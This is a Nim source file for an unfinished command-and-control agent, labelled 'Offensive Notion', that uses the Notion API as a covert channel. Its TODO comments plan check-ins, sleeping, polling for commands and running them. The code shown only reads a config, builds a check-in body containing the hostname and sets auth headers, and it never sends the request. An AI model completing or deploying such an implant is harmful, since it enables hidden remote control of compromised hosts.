import std/strformat
import parseutils
import os
import nativesockets
import std/json
import httpclient

#[
    Things we need to do:
    Load the API key*
    Start comms by making a new page*
    Sleep* 
    Get new blocks*
    Any new commands?*
    Do em*
]#

let URL_BASE = "https://api.notion.com/v1"


proc getConfigOptions(): tuple =
    #[  
        This procedure represents everything we would want to pull in from a config file at compile time.
        TODO: look into TOML/YAML parsing
    ]#
    echo "[*] Enter agent sleep interval > "
    let SLEEP_INTERVAL = readLine(stdin)

    echo "[*] Enter the ID of the parent page > "
    let PARENT_PAGE = readLine(stdin)

    echo "[*] Enter Notion API Key > "
    let NOTION_API_KEY = readLine(stdin)

    return (SLEEP_INTERVAL, PARENT_PAGE, NOTION_API_KEY)


# Create Agent Check-in Page
proc createPage(headers: array[0..2, (string, string)], configs: tuple): void =
    let hostname = getHostname()
    let url = fmt"{URL_BASE}/pages/"

    # Craft JSON body
    var body = %*
        [
            { 
            "parent":{
                "type": "page_id",
                "page_id": fmt"{configs[1]}" 
                },
                "properties": {
                "title":[{
                    "text": {
                        "content": hostname
                        }
                }]
                }
            }
        ]
    echo "[*] JSON body:"
    echo body
    # Craft JSON request



# Get new blocks*

# Any new commands?

# Do em*


proc main(): void =
    echo "[*] Offensive Notion! Because Reasons!"
    let configs = getConfigOptions()
    let headers = {
        "Notion-Version": "2021-08-16",
        "Content-Type": "application/json",
        "Authorization": fmt"Bearer {configs[2]}"
    }
    createPage(headers, configs)


when isMainModule:
    main()